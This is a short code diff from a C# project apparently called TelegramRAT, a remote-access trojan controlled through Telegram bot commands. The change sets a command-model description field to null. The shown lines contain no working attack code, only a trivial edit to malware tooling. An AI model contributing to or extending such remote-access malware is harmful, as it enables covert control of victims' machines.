@@ -21,7 +21,7 @@ namespace TelegramRAT
         public bool IgnoreCountArgs = false;
         public bool MayHaveNoArgs = false;
 
-        public string description = "This command has no arguments...";
+        public string description = null;
 
         public static BotCommandModel Parse(string text)
         {
